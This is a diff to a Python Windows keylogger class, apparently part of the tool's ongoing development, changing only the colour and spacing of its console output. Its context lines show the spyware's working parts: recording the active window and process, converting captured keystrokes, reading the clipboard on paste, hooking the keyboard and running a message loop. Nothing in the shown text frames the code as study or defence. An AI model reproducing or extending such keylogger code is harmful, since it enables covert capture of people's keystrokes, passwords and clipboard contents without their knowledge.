@@ -63,7 +63,7 @@ class KeyLogger:
             except UnicodeDecodeError as e:
                 print(f'{e}: window name unknown')
             
-            print(f"\n[{bcolors.WARNING}%{bcolors.ENDC}] [{bcolors.WARNING}" + processID + f"{bcolors.ENDC}] [{bcolors.WARNING}" + str(executable.value.decode()) + f"{bcolors.ENDC}] [{bcolors.WARNING}" + str(self.currentWindow) + f"{bcolors.ENDC}]\n")
+            print(f"\n[{bcolors.WARNING}%{bcolors.ENDC}] [{bcolors.ORANGE}" + processID + f"{bcolors.ENDC}] [{bcolors.WARNING}" + str(executable.value.decode()) + f"{bcolors.ENDC}] [{bcolors.WARNING}" + str(self.currentWindow) + f"{bcolors.ENDC}]\n")
             
             windll.kernel32.CloseHandle(hwnd)
             windll.kernel32.CloseHandle(hProcess)
@@ -82,7 +82,7 @@ class KeyLogger:
             # Identify what key it was
             if 32 < event.Ascii < 127:
                 keyPressed = str(chr(event.Ascii))
-                print(f" [{bcolors.OKCYAN}" + keyPressed + f"{bcolors.ENDC}]", end='')
+                print(f"[{bcolors.OKCYAN}" + keyPressed + f"{bcolors.ENDC}]", end='')
             else:
                 if event.Key == 'V':
                     win32clipboard.OpenClipboard()
@@ -119,7 +119,7 @@ def run():
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Hooking into keyboard...")
         hm.HookKeyboard()
         
-        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Starting event loop...")
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Starting event loop...\n")
         while True:
             pythoncom.PumpWaitingMessages()
             
